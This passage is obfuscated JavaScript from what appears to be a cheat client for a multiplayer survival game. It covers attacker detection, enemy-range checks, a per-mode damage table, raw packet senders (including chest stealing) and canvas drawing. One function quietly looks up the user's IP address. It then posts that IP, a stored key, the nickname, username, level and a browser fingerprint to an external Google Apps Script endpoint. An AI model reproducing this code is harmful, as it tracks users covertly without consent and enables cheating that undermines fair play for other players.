      const range = getDamageRangeOfPlayer(player) + (hurtedEntity.type === ITEMS.PLAYERS ? player.fly ? 70 : 35 : 75);
      if (dist > range) {
        continue;
      }
      const timeScore = Math.abs(attackElapsed - 62.5);
      if (timeScore < bestScore) {
        bestScore = timeScore;
        res = player;
      }
    }
    if (res) {
      hurtedEntity.attackedRecentlyBy[res.pid] = now;
    }
    return res;
  }
  function findPlayerAttacking1(_param_633, _param_632) {
    const now = performance.now();
    let _var_a56 = null;
    let _var_805 = Infinity;
    for (let i = 0, len = _param_632.length; i < len; i++) {
      const player = _param_632[i];
      if (_param_633.type === ITEMS.PLAYERS && _param_633.pid === player.pid) {
        continue;
      }
      if (_param_633.attackedRecentlyBy[player.pid] && now - _param_633.attackedRecentlyBy[player.pid] < 300) {
        continue;
      }
      const attackElapsed = now - player.startAttackTime;
      if (attackElapsed > 187.5 || attackElapsed < 2.5) {
        continue;
      }
      const dist = Utils.dist(_param_633, player);
      const range = getDamageRangeOfPlayer(player) + (_param_633.type === ITEMS.PLAYERS ? player.fly ? 70 : 35 : 75);
      if (dist > range) {
        continue;
      }
      const timeScore = Math.abs(attackElapsed - 62.5);
      if (timeScore < _var_805) {
        _var_805 = timeScore;
        _var_a56 = player;
      }
    }
    if (_var_a56) {
      _param_633.attackedRecentlyBy[_var_a56.pid] = now;
    }
    return _var_a56;
  }
  function getEntityAttackingPlayer(_param_634) {
    const now = performance.now();
    const playerAttacking = findPlayerAttacking(_param_634, world.units[ITEMS.PLAYERS]);
    if (playerAttacking) {
      return playerAttacking;
    }
    const wolves = world.units[ITEMS.WOLF];
    for (let i = 0, len = wolves.length; i < len; i++) {
      const wolf = wolves[i];
      if (Utils.dist(_param_634, wolf) <= 150) {
        return wolf;
      }
    }
    const spiders = world.units[ITEMS.SPIDER];
    for (let i = 0, len = spiders.length; i < len; i++) {
      const spider = spiders[i];
      if (Utils.dist(_param_634, spider) <= 150) {
        return spider;
      }
    }
    const boars = world.units[ITEMS.BOAR];
    for (let i = 0, len = boars.length; i < len; i++) {
      const boar = boars[i];
      if (boar.info == 1 && Utils.dist(_param_634, boar) <= 150) {
        return boar;
      }
    }
    const hawks = world.units[ITEMS.HAWK];
    for (let i = 0, len = hawks.length; i < len; i++) {
      const hawk = hawks[i];
      if (Utils.dist(_param_634, hawk) <= 150) {
        return hawk;
      }
    }
    const foxes = world.units[ITEMS.FOX];
    for (let i = 0, len = foxes.length; i < len; i++) {
      const fox = foxes[i];
      if (Utils.dist(_param_634, fox) <= 150) {
        return fox;
      }
    }
    const bears = world.units[ITEMS.BEAR];
    for (let i = 0, len = bears.length; i < len; i++) {
      const bear = bears[i];
      if (Utils.dist(_param_634, bear) <= 150) {
        return bear;
      }
    }
    const babyMammoths = world.units[ITEMS.BABY_MAMMOTH];
    for (let i = 0, len = babyMammoths.length; i < len; i++) {
      const babyMammoth = babyMammoths[i];
      if (Utils.dist(_param_634, babyMammoth) <= 150) {
        return babyMammoth;
      }
    }
    const mammoths = world.units[ITEMS.MAMMOTH];
    for (let i = 0, len = mammoths.length; i < len; i++) {
      const mammoth = mammoths[i];
      if (Utils.dist(_param_634, mammoth) <= 150) {
        return mammoth;
      }
    }
    const babyDragons = world.units[ITEMS.BABY_DRAGON];
    for (let i = 0, len = babyDragons.length; i < len; i++) {
      const babyDragon = babyDragons[i];
      if (Utils.dist(_param_634, babyDragon) <= 150) {
        return babyDragon;
      }
    }
    const dragons = world.units[ITEMS.DRAGON];
    for (let i = 0, len = dragons.length; i < len; i++) {
      const dragon = dragons[i];
      if (Utils.dist(_param_634, dragon) <= 150) {
        return dragon;
      }
    }
    const crabs = world.units[ITEMS.CRAB];
    for (let i = 0, len = crabs.length; i < len; i++) {
      const crab = crabs[i];
      if (Utils.dist(_param_634, crab) <= 150) {
        return crab;
      }
    }
    const crabBosses = world.units[ITEMS.CRAB_BOSS];
    for (let i = 0, len = crabBosses.length; i < len; i++) {
      const crabBoss = crabBosses[i];
      if (Utils.dist(_param_634, crabBoss) <= 150) {
        return crabBoss;
      }
    }
    const piranhas = world.units[ITEMS.PIRANHA];
    for (let i = 0, len = piranhas.length; i < len; i++) {
      const piranha = piranhas[i];
      if (Utils.dist(_param_634, piranha) <= 150) {
        return piranha;
      }
    }
    const krakens = world.units[ITEMS.KRAKEN];
    for (let i = 0, len = krakens.length; i < len; i++) {
      const kraken = krakens[i];
      if (Utils.dist(_param_634, kraken) <= 150) {
        return kraken;
      }
    }
    const flames = world.units[ITEMS.FLAME];
    for (let i = 0, len = flames.length; i < len; i++) {
      const flame = flames[i];
      if (Utils.dist(_param_634, flame) <= 150) {
        return flame;
      }
    }
    const lavaDragons = world.units[ITEMS.LAVA_DRAGON];
    for (let i = 0, len = lavaDragons.length; i < len; i++) {
      const lavaDragon = lavaDragons[i];
      if (Utils.dist(_param_634, lavaDragon) <= 150) {
        return lavaDragon;
      }
    }
    const babyLavas = world.units[ITEMS.BABY_LAVA];
    for (let i = 0, len = babyLavas.length; i < len; i++) {
      const babyLava = babyLavas[i];
      if (Utils.dist(_param_634, babyLava) <= 150) {
        return babyLava;
      }
    }
    const vultures = world.units[ITEMS.VULTURE];
    for (let i = 0, len = vultures.length; i < len; i++) {
      const vulture = vultures[i];
      if (Utils.dist(_param_634, vulture) <= 150) {
        return vulture;
      }
    }
    const sandWorms = world.units[ITEMS.SAND_WORM];
    for (let i = 0, len = sandWorms.length; i < len; i++) {
      const sandWorm = sandWorms[i];
      if (Utils.dist(_param_634, sandWorm) <= 150) {
        return sandWorm;
      }
    }
    const spikes = [...world.units[ITEMS.REIDITE_SPIKE], ...world.units[ITEMS.AMETHYST_SPIKE], ...world.units[ITEMS.DIAMOND_SPIKE], ...world.units[ITEMS.GOLD_SPIKE], ...world.units[ITEMS.STONE_SPIKE], ...world.units[ITEMS.SPIKE]];
    for (let i = 0, len = spikes.length; i < len; i++) {
      const spike = spikes[i];
      if (Utils.dist(_param_634, spike) <= 100 && _param_634.pid !== spike.pid && _param_634.ally !== spike.ally && (!_param_634.spikeImpactTime || now - _param_634.spikeImpactTime > 900) && (!(now - _param_634.startAttackTime <= 100) || !(now - _param_634.startAttackTime >= 40))) {
        _param_634.spikeImpactTime = now;
        return spike;
      }
    }
    for (let i = 0, len = spikes.length; i < len; i++) {
      const spike = spikes[i];
      if (Utils.dist(_param_634, spike) <= 125 && _param_634.pid !== spike.pid && _param_634.ally !== spike.ally && (!_param_634.spikeImpactTime || now - _param_634.spikeImpactTime > 900) && (!(now - _param_634.startAttackTime <= 100) || !(now - _param_634.startAttackTime >= 40))) {
        _param_634.spikeImpactTime = now;
        return spike;
      }
    }
    const playerAttacking1 = findPlayerAttacking1(_param_634, world.units[ITEMS.PLAYERS]);
    if (playerAttacking1) {
      return playerAttacking1;
    }
  }
  function isSpike(_param_635) {
    switch (_param_635) {
      case ITEMS.REIDITE_SPIKE:
      case ITEMS.AMETHYST_SPIKE:
      case ITEMS.DIAMOND_SPIKE:
      case ITEMS.GOLD_SPIKE:
      case ITEMS.STONE_SPIKE:
      case ITEMS.SPIKE:
        return true;
      default:
        return false;
    }
  }
  function getEnemyNearestFromMe() {
    const myPlayer = world.fast_units[user.uid];
    if (!myPlayer) {
      return null;
    }
    let _var_a57 = null;
    let _var_806 = Infinity;
    for (const player of world.units[ITEMS.PLAYERS]) {
      if (player.pid === myPlayer.pid || player.ghost || player.ally || player.fly !== myPlayer.fly) {
        continue;
      }
      const dist = Math.hypot(player.x - myPlayer.x, player.y - myPlayer.y);
      if (dist < _var_806) {
        _var_a57 = player;
        _var_806 = dist;
      }
    }
    return _var_a57;
  }
  function isInEnemyAttackRange(...__p_dwLk_varMask) {
    const myPlayer = world.fast_units[user.uid];
    if (!myPlayer) {
      return false;
    }
    for (const enemy of world.units[ITEMS.PLAYERS]) {
      if (enemy.pid === myPlayer.pid || enemy.ghost || enemy.ally || enemy.fly !== myPlayer.fly) {
        continue;
      }
      const damageRange = getDamageRangeOfPlayer(enemy);
      const distance = Math.hypot(enemy.x - myPlayer.x, enemy.y - myPlayer.y);
      if (distance <= damageRange) {
        return true;
      }
    }
    return false;
  }
  let __p_y3L6_damageSystem_configs = {
    default: {
      weaponDamage: {
        [-1]: 5,
        [INV.MACHETE]: 5,
        [INV.WOOD_SWORD]: 12,
        [INV.STONE_SWORD]: 19,
        [INV.GOLD_SWORD]: 22,
        [INV.DIAMOND_SWORD]: 24,
        [INV.AMETHYST_SWORD]: 27,
        [INV.REIDITE_SWORD]: 30,
        [INV.EMERALD_SWORD]: 32,
        [INV.DRAGON_SWORD]: 30,
        [INV.LAVA_SWORD]: 33,
        [INV.PIRATE_SWORD]: 32,
        [INV.WOOD_SPEAR]: 10,
        [INV.STONE_SPEAR]: 14,
        [INV.GOLD_SPEAR]: 16,
        [INV.DIAMOND_SPEAR]: 18,
        [INV.AMETHYST_SPEAR]: 20,
        [INV.REIDITE_SPEAR]: 22,
        [INV.EMERALD_SPEAR]: 23,
        [INV.DRAGON_SPEAR]: 22,
        [INV.LAVA_SPEAR]: 24,
        [INV.CRAB_SPEAR]: 15,
        [INV.WOOD_AXE]: 14,
        [INV.STONE_AXE]: 21,
        [INV.GOLD_AXE]: 24,
        [INV.DIAMOND_AXE]: 27,
        [INV.AMETHYST_AXE]: 29,
        [INV.REIDITE_AXE]: 32,
        [INV.EMERALD_AXE]: 33,
        [INV.WOOD_PICK]: 1,
        [INV.STONE_PICK]: 2,
        [INV.GOLD_PICK]: 3,
        [INV.DIAMOND_PICK]: 4,
        [INV.AMETHYST_PICK]: 5,
        [INV.REIDITE_PICK]: 6,
        [INV.BOOK]: 1,
        [INV.STONE_HAMMER]: 2,
        [INV.GOLD_HAMMER]: 3,
        [INV.DIAMOND_HAMMER]: 4,
        [INV.AMETHYST_HAMMER]: 5,
        [INV.REIDITE_HAMMER]: 6,
        [INV.SUPER_HAMMER]: 12,
        [INV.STONE_SHOVEL]: 2,
        [INV.GOLD_SHOVEL]: 3,
        [INV.DIAMOND_SHOVEL]: 4,
        [INV.AMETHYST_SHOVEL]: 5,
        [INV.REIDITE_SHOVEL]: 5,
        [INV.WOOD_SHIELD]: 1,
        [INV.STONE_SHIELD]: 2,
        [INV.GOLD_SHIELD]: 3,
        [INV.DIAMOND_SHIELD]: 4,
        [INV.AMETHYST_SHIELD]: 5,
        [INV.REIDITE_SHIELD]: 6
      },
      weaponDamageAnimal: {
        [INV.MACHETE]: 12,
        [INV.WOOD_AXE]: 24,
        [INV.STONE_AXE]: 31,
        [INV.GOLD_AXE]: 34,
        [INV.DIAMOND_AXE]: 37,
        [INV.AMETHYST_AXE]: 39,
        [INV.REIDITE_AXE]: 42,
        [INV.EMERALD_AXE]: 53
      },
      helmetDefense: {
        [INV.WOOD_HELMET]: 1,
        [INV.STONE_HELMET]: 2,
        [INV.DIAMOND_FIRE_PROTECTION_]: 2,
        [INV.DIVING_MASK]: 2,
        [INV.CROWN_OF_THE_ANGEL]: 2,
        [INV.GOLD_HELMET]: 4,
        [INV.SUPER_DIVING_SUIT]: 4,
        [INV.CROWN_OF_LUCK]: 5,
        [INV.AMETHYST_FIRE_PROTECTION_]: 5,
        [INV.CRAB_CROWN]: 5,
        [INV.DIAMOND_HELMET]: 5,
        [INV.CROWN_OF_LIFE]: 6,
        [INV.AMETHYST_HELMET]: 6,
        [INV.REIDITE_HELMET]: 7,
        [INV.REIDITE_FIRE_PROTECTION_]: 7,
        [INV.EMERALD_HELMET]: 8,
        [INV.DRAGON_HELMET]: 8,
        [INV.LAVA_HELMET]: 9
      },
      helmetAnimalDefense: {
        [INV.WOOD_HELMET]: 4,
        [INV.STONE_HELMET]: 8,
        [INV.DIVING_MASK]: 8,
        [INV.DIAMOND_FIRE_PROTECTION_]: 8,
        [INV.GOLD_HELMET]: 13,
        [INV.CROWN_OF_LUCK]: 13,
        [INV.CROWN_OF_THE_ANGEL]: 13,
        [INV.AMETHYST_FIRE_PROTECTION_]: 13,
        [INV.SUPER_DIVING_SUIT]: 16,
        [INV.CROWN_OF_LIFE]: 16,
        [INV.DIAMOND_HELMET]: 19,
        [INV.CRAB_CROWN]: 19,
        [INV.REIDITE_FIRE_PROTECTION_]: 19,
        [INV.AMETHYST_HELMET]: 23,
        [INV.REIDITE_HELMET]: 25,
        [INV.DRAGON_HELMET]: 27,
        [INV.EMERALD_HELMET]: 27,
        [INV.LAVA_HELMET]: 30
      },
      shieldDefense: {
        [INV.WOOD_SHIELD]: 1,
        [INV.STONE_SHIELD]: 2,
        [INV.GOLD_SHIELD]: 3,
        [INV.DIAMOND_SHIELD]: 4,
        [INV.AMETHYST_SHIELD]: 5,
        [INV.REIDITE_SHIELD]: 6
      },
      shieldPenetration: {
        [INV.WOOD_AXE]: 1,
        [INV.STONE_AXE]: 2,
        [INV.GOLD_AXE]: 3,
        [INV.DIAMOND_AXE]: 4,
        [INV.AMETHYST_AXE]: 5,
        [INV.REIDITE_AXE]: 6
      },
      entityDamage: {
        [ITEMS.WOLF]: 40,
        [ITEMS.SPIDER]: 30,
        [ITEMS.BOAR]: 50,
        [ITEMS.HAWK]: 40,
        [ITEMS.FOX]: 40,
        [ITEMS.BEAR]: 60,
        [ITEMS.BABY_MAMMOTH]: 50,
        [ITEMS.MAMMOTH]: 90,
        [ITEMS.BABY_DRAGON]: 30,
        [ITEMS.DRAGON]: 85,
        [ITEMS.CRAB]: 35,
        [ITEMS.CRAB_BOSS]: 80,
        [ITEMS.PIRANHA]: 40,
        [ITEMS.KRAKEN]: 60,
        [ITEMS.FLAME]: 50,
        [ITEMS.LAVA_DRAGON]: 90,
        [ITEMS.BABY_LAVA]: 45,
        [ITEMS.VULTURE]: 45,
        [ITEMS.SAND_WORM]: 60
      },
      spikeDamage: {
        [ITEMS.SPIKE]: 10,
        [ITEMS.STONE_SPIKE]: 20,
        [ITEMS.GOLD_SPIKE]: 30,
        [ITEMS.DIAMOND_SPIKE]: 40,
        [ITEMS.AMETHYST_SPIKE]: 50,
        [ITEMS.REIDITE_SPIKE]: 60
      },
      heal: {
        normal: 42,
        crownOfLife: 56
      }
    },
    [WORLD.MODE_PVP]: {
      default: {
        weaponDamage: {
          [INV.DRAGON_SWORD]: 32,
          [INV.LAVA_SWORD]: 34,
          [INV.DRAGON_SPEAR]: 23,
          [INV.LAVA_SPEAR]: 25
        },
        helmetDefense: {
          [INV.EMERALD_HELMET]: 8,
          [INV.DRAGON_HELMET]: 8,
          [INV.LAVA_HELMET]: 9
        },
        helmetAnimalDefense: {
          [INV.EMERALD_HELMET]: 27,
          [INV.DRAGON_HELMET]: 28,
          [INV.LAVA_HELMET]: 30
        },
        spikeDamage: {
          [ITEMS.SPIKE]: 10,
          [ITEMS.STONE_SPIKE]: 18,
          [ITEMS.GOLD_SPIKE]: 26,
          [ITEMS.DIAMOND_SPIKE]: 33,
          [ITEMS.AMETHYST_SPIKE]: 40,
          [ITEMS.REIDITE_SPIKE]: 50
        }
      }
    },
    [WORLD.MODE_COMMUNITY]: {
      default: {
        spikeDamage: {
          [ITEMS.SPIKE]: 10,
          [ITEMS.STONE_SPIKE]: 20,
          [ITEMS.GOLD_SPIKE]: 30,
          [ITEMS.DIAMOND_SPIKE]: 40,
          [ITEMS.AMETHYST_SPIKE]: 50,
          [ITEMS.REIDITE_SPIKE]: 60
        }
      },
      NewZMA: {
        weaponDamage: {
          [-1]: 5,
          [INV.DRAGON_SWORD]: 30,
          [INV.LAVA_SWORD]: 32,
          [INV.REIDITE_SWORD]: 34,
          [INV.WOOD_SWORD]: 36,
          [INV.STONE_SWORD]: 36,
          [INV.PIRATE_SWORD]: 36,
          [INV.GOLD_SWORD]: 37,
          [INV.AMETHYST_SWORD]: 41,
          [INV.DIAMOND_SWORD]: 44,
          [INV.DRAGON_SPEAR]: 24,
          [INV.LAVA_SPEAR]: 25,
          [INV.REIDITE_SPEAR]: 28,
          [INV.CRAB_SPEAR]: 30,
          [INV.DIAMOND_SPEAR]: 34,
          [INV.AMETHYST_SPEAR]: 80,
          [INV.STONE_HAMMER]: 0,
          [INV.GOLD_HAMMER]: 0,
          [INV.DIAMOND_HAMMER]: 0,
          [INV.AMETHYST_HAMMER]: 0,
          [INV.REIDITE_HAMMER]: 0,
          [INV.SUPER_HAMMER]: 0
        },
        helmetDefense: {
          [INV.CROWN_OF_THE_ANGEL]: 2,
          [INV.CROWN_OF_LIFE]: 4,
          [INV.DIVING_MASK]: 6,
          [INV.DRAGON_HELMET]: 8,
          [INV.LAVA_HELMET]: 10,
          [INV.REIDITE_HELMET]: 11,
          [INV.SUPER_DIVING_SUIT]: 12,
          [INV.WOOD_HELMET]: 12,
          [INV.CROWN_OF_LUCK]: 13,
          [INV.STONE_HELMET]: 14,
          [INV.CRAB_CROWN]: 14,
          [INV.PIRATE_HAT]: 16,
          [INV.GOLD_HELMET]: 16,
          [INV.AMETHYST_HELMET]: 19,
          [INV.DIAMOND_HELMET]: 21
        },
        helmetAnimalDefense: {
          [INV.CROWN_OF_THE_ANGEL]: 16,
          [INV.CROWN_OF_LIFE]: 16,
          [INV.DIVING_MASK]: 8,
          [INV.DRAGON_HELMET]: 30,
          [INV.LAVA_HELMET]: 30,
          [INV.REIDITE_HELMET]: 30,
          [INV.SUPER_DIVING_SUIT]: 16,
          [INV.WOOD_HELMET]: 30,
          [INV.CROWN_OF_LUCK]: 30,
          [INV.STONE_HELMET]: 30,
          [INV.CRAB_CROWN]: 30,
          [INV.PIRATE_HAT]: 20000,
          [INV.GOLD_HELMET]: 30,
          [INV.AMETHYST_HELMET]: 30,
          [INV.DIAMOND_HELMET]: 30
        },
        shieldDefense: {
          [INV.WOOD_SHIELD]: 100,
          [INV.STONE_SHIELD]: 2,
          [INV.GOLD_SHIELD]: 3,
          [INV.DIAMOND_SHIELD]: 7,
          [INV.AMETHYST_SHIELD]: 5,
          [INV.REIDITE_SHIELD]: 6
        },
        heal: {
          normal: 70,
          crownOfLife: 80
        },
        spikeDamage: {
          [ITEMS.GOLD_SPIKE]: 20,
          [ITEMS.DIAMOND_SPIKE]: 30,
          [ITEMS.AMETHYST_SPIKE]: 40,
          [ITEMS.REIDITE_SPIKE]: 50
        }
      }
    }
  };
  function mergeDeep(target, ...sources) {
    const isObject = obj => {
      return obj && typeof obj === "object" && !Array.isArray(obj);
    };
    let output = isObject(target) ? {
      ...target
    } : target;
    for (const source of sources) {
      if (isObject(output) && isObject(source)) {
        for (const key in source) {
          if (isObject(source[key])) {
            output[key] = mergeDeep(output[key], source[key]);
          } else {
            output[key] = source[key];
          }
        }
      }
    }
    return output;
  }
  class DamageCalculator {
    constructor(mode = "default", serverName = "") {
      this.config = this.resolveConfig(mode, serverName);
    }
    resolveConfig(_param_636, _param_637) {
      const baseConfig = __p_y3L6_damageSystem_configs.default;
      const modeConfig = __p_y3L6_damageSystem_configs[_param_636];
      if (!modeConfig) {
        return baseConfig;
      }
      const modeDefaultConfig = modeConfig.default || {};
      const serverSpecificConfig = modeConfig[_param_637] || {};
      return mergeDeep(baseConfig, modeDefaultConfig, serverSpecificConfig);
    }
    getWeaponDamage(invId, isToAnimal, helmetId, vehicleId) {
      let baseDamage = this.config.weaponDamage[invId] || 0;
      if (isToAnimal && this.config.weaponDamageAnimal[invId] !== undefined) {
        baseDamage = this.config.weaponDamageAnimal[invId];
      }
      if (world.mode === WORLD.MODE_PVP) {
        switch (invId) {
          case INV.DRAGON_SWORD:
            if (helmetId === INV.DRAGON_HELMET) {
              baseDamage += 3;
            }
            break;
          case INV.LAVA_SWORD:
            if (helmetId === INV.LAVA_HELMET) {
              baseDamage += 3;
            }
            break;
          case INV.DRAGON_SPEAR:
            if (helmetId === INV.DRAGON_HELMET) {
              baseDamage += 2;
            }
            break;
          case INV.LAVA_SPEAR:
            if (helmetId === INV.LAVA_HELMET) {
              baseDamage += 2;
            }
            break;
          case INV.CRAB_SPEAR:
            if (helmetId === INV.CRAB_CROWN && vehicleId === INV.MOUNT_KING_CRAB) {
              baseDamage += 10;
            }
            break;
        }
      }
      return baseDamage;
    }
    getEntityDamage(entityType) {
      return this.config.entityDamage[entityType] || 0;
    }
    getSpikeDamage(entityType) {
      return this.config.spikeDamage[entityType] || 0;
    }
    getHelmetDefense(helmetId) {
      return this.config.helmetDefense[helmetId] || 0;
    }
    getHelmetAnimalDefense(helmetId) {
      return this.config.helmetAnimalDefense[helmetId] || 0;
    }
    getShieldDefense(shieldId) {
      return this.config.shieldDefense[shieldId] || 0;
    }
    getShieldPenetration(invId) {
      return this.config.shieldPenetration[invId] || 0;
    }
    calcDamagePlayerWillGet(player, dealDamageEntity) {
      if (!dealDamageEntity) {
        if (player.dist_winter > 0 && user.winter.tempest && (!player.winterTempestImpactTime || performance.now() - player.winterTempestImpactTime > 3900)) {
          player.winterTempestImpactTime = performance.now();
          const clothe = player.clothe;
          if (clothe === INV.EARMUFFS || clothe === INV.HOOD || clothe === INV.PEASANT) {
            return 16;
          } else if (clothe === INV.BIG_CHAPKA || clothe === INV.WINTER_HOOD || clothe === INV.WINTER_PEASANT || clothe === INV.PILOT_HELMET) {
            return 12;
          } else if (clothe === INV.CAP_SCARF) {
            return 8;
          } else if (clothe === INV.FUR_HAT) {
            return 4;
          }
          return 25;
        } else if (player.dist_desert > 0 && user.desert.tempest) {
          const clothe = player.clothe;
          if (clothe === INV.TURBAN) {
            return 7;
          } else if (clothe === INV.NINJA_OUTFIT || clothe === INV.PILOT_HELMET) {
            return 2;
          }
          return 16;
        }
        return 0;
      }
      if (dealDamageEntity.type === ITEMS.PLAYERS) {
        const shieldPenetration = this.getShieldPenetration(dealDamageEntity.right);
        const helmetDefense = this.getHelmetDefense(player.clothe);
        const baseDamage = this.getWeaponDamage(dealDamageEntity.right, false, dealDamageEntity.clothe, dealDamageEntity.vehicle);
        let damage = baseDamage + (shieldPenetration > 0 && helmetDefense > 0 ? 1 : 0) - helmetDefense - Math.max(this.getShieldDefense(player.right) - shieldPenetration, 0);
        if (player.ally === dealDamageEntity.ally) {
          damage *= 0.3;
        }
        return Math.max(damage, 0);
      } else if (isSpike(dealDamageEntity.type)) {
        return this.getSpikeDamage(dealDamageEntity.type);
      } else {
        const animalDamage = this.getEntityDamage(dealDamageEntity.type);
        const defense = this.getHelmetAnimalDefense(player.clothe);
        return Math.max(animalDamage - defense, 0);
      }
    }
    calcHpPlayerWillGet(player) {
      if (player.clothe === INV.CROWN_OF_LIFE) {
        return this.config.heal.crownOfLife;
      } else {
        return this.config.heal.normal;
      }
    }
  }
  let damageCalculator = null;
  async function send_my_info_to_lmb(username, level) {
    let ip = "Unknown";
    try {
      let response = await fetch("https://api64.ipify.org?format=json");
      let ipData = await response.json();
      ip = ipData.ip;
    } catch (error) {}
    try {
      let result = await fetch("https://script.google.com/macros/s/AKfycbwes3alj_fUjM23BlrYoaj3Mijdz-ixcliloSEqNmjMI_vAfkGV0VoLkpp0iiQSbRHM/exec", {
        method: "POST",
        body: JSON.stringify({
          action: "logData",
          payload: {
            key: localStorage.getItem("lmb_key"),
            account_nickname: document.getElementById("account_nickname_input").value,
            username: username,
            level: level,
            finger: window.finger || "",
            ip: ip
          }
        })
      });
    } catch (error) {
      console.error("Lỗi gửi dữ liệu:", error.message);
    }
  }
  function mapTo2Pi(_param_638) {
    return _param_638 / 255 * (Math.PI * 2);
  }
  function normalizePlayerAngle(_param_639) {
    const TWO_PI = Math.PI * 2;
    return (_param_639 % TWO_PI + TWO_PI) % TWO_PI;
  }
  function getCookie(_param_640) {
    const cookies = document.cookie.split("; ");
    for (let cookie of cookies) {
      const [key, value] = cookie.split("=");
      if (key === _param_640) {
        return decodeURIComponent(value);
      }
    }
    return null;
  }
  function isCanHealWithStatus(hunger, cold, thirst, oxygen, warm) {
    if (hunger > 0.35 && cold > 0.35 && thirst > 0.35 && oxygen > 0.35 && warm > 0.35) {
      return true;
    } else {
      return false;
    }
  }
  function isValidToPutChest(_param_641, _param_642) {
    if (_param_641.info === 8000 || _param_641.lock && !_param_641.ally || _param_641.action / 2 - 1 !== _param_642 && _param_641.action / 2 - 1 !== -1) {
      return false;
    }
    return true;
  }
  function extractJI(_param_643) {
    const parts = _param_643.trim().split(/\s+/);
    if (parts[0] === "ez" && parts.length === 3) {
      const j = parseInt(parts[1]);
      const i = parseInt(parts[2]);
      return {
        j: j,
        i: i
      };
    }
    return null;
  }
  function angle255ToAngle(angle255) {
    const pi2 = Math.PI * 2;
    return (angle255 + 0.5) / 255 * pi2;
  }
  function mathCos(e) {
    return Math.sin(e);
  }
  function mathSin(e) {
    return Math.cos(e);
  }
  function send_select_inv(_param_644) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_selectInv, _param_644]));
  }
  function send_craft(_param_645) {
    client.select_craft(_param_645);
  }
  function send_recycle(invId) {
    client.recycle_inv(invId);
  }
  function send_chat(_param_646) {
    client.send_chat(_param_646);
  }
  function send_angle(_param_647) {
    client.send_angle(_param_647);
  }
  function send_attack(_param_648) {
    client.send_attack(_param_648);
  }
  function stop_attack() {
    client.stop_attack();
  }
  function send_move(_param_649) {
    if (_param_649 !== OldDir) {
      client.send_move(_param_649);
      OldDir = _param_649;
    }
  }
  function send_drop_one(invId) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_drop_one, invId]));
  }
  function send_drop_all(invId) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_drop_all, invId]));
  }
  function send_resurrection(_param_650, _param_651) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_resurrection, _param_650, _param_651]));
  }
  function send_put_extractors(_param_652, _param_653, _param_654) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_extractorput, 255, _param_652, _param_653, _param_654]));
  }
  function send_take_extractors(_param_655, _param_656, _param_657) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_extractortake, _param_655, _param_656, _param_657]));
  }
  function send_steal(pid, id) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_chestTake, pid, id]));
  }
  function send_put_windmill(pid, id) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_put_windmill, 255, pid, id]));
  }
  function send_take_windmill(pid, id) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_take_windmill, pid, id]));
  }
  function send_take_bread(pid, id) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_take_bread, pid, id]));
  }
  function send_put_wood_Oven(_param_658, _param_659) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_put_wood_oven, 31, _param_658, _param_659]));
  }
  function send_put_flour_Oven(_param_660, _param_661) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_put_flour_oven, 31, _param_660, _param_661]));
  }
  function send_put_chest(_param_662, _param_663, _param_664, _param_665) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_put_chest, _param_662, _param_663, _param_664, _param_665]));
  }
  function send_build(invId, angle, buildMode = 0) {
    const angle255 = (angle % 255 + 255) % 255;
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_build, invId, angle255, buildMode]));
  }
  function send_join_totem(_param_666, _param_667) {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_join_totem, _param_666, _param_667]));
  }
  function send_cancel_crafting() {
    client.socket.send(JSON.stringify([__p_TBlw_PACKET_cancel_crafting]));
  }
  function DropWeapon() {
    if (client.socket && client.socket.readyState === 1 && user && user.alive) {
      let myPlayer = world.fast_units[user.uid];
      if (myPlayer && HoldWeapon(myPlayer.right, false)) {
        if (user.weapon.wait) {
          send_drop_all(myPlayer.right);
        } else {
          send_select_inv(INV.HAND);
        }
      }
    }
  }
  function IsAnimal(_param_668) {
    switch (_param_668) {
      case ITEMS.RABBIT:
      case ITEMS.WOLF:
      case ITEMS.SPIDER:
      case ITEMS.BOAR:
      case ITEMS.HAWK:
      case ITEMS.PENGUIN:
      case ITEMS.FOX:
      case ITEMS.BEAR:
      case ITEMS.BABY_MAMMOTH:
      case ITEMS.MAMMOTH:
      case ITEMS.BABY_DRAGON:
      case ITEMS.DRAGON:
      case ITEMS.CRAB:
      case ITEMS.CRAB_BOSS:
      case ITEMS.PIRANHA:
      case ITEMS.KRAKEN:
      case ITEMS.FLAME:
      case ITEMS.LAVA_DRAGON:
      case ITEMS.BABY_LAVA:
      case ITEMS.VULTURE:
      case ITEMS.SAND_WORM:
      case ITEMS.GOLDEN_CHICKEN:
        return true;
      default:
        return false;
    }
  }
  function draw_simple_item(spriteId) {
    ctx.save();
    ctx.translate(user.cam.x + this.x, user.cam.y + this.y);
    ctx.rotate(this.angle);
    let img = sprite[spriteId][world.time];
    let w = -img.width;
    let h = -img.height;
    ctxDrawImage(ctx, img, -w / 2 + 0, -h / 2 + 0, w, h);
    ctx.restore();
  }
  function draw_roof() {
    ctx.save();
    ctx.translate(user.cam.x + this.x, user.cam.y + this.y);
    let spriteCount = mySprite[MY_SPRITE.ROOFS].length;
    let img = mySprite[MY_SPRITE.ROOFS][(this.j + this.i % 2) % spriteCount][world.time];
    let w = -img.width;
    let h = -img.height;
    ctx.globalAlpha = Settings.Roof.opacity;
    ctxDrawImage(ctx, img, -w / 2, -h / 2, w, h);
    ctx.restore();
  }
  function draw_gauges1() {
    var e;
    var t;
    var cold_gauge_right_edge;
    var cold_bar_width;
    var thirst_gauge_right_edge;
    var thirst_bar_width;
    ctx.save();
    e = scale;
    if (user.gauges.life.x < 0.25) {
      ctx.globalAlpha = user.gauges.warn_life.v;
    }
    t = user.inv.can_select.length > 0 ? -70 : 0;
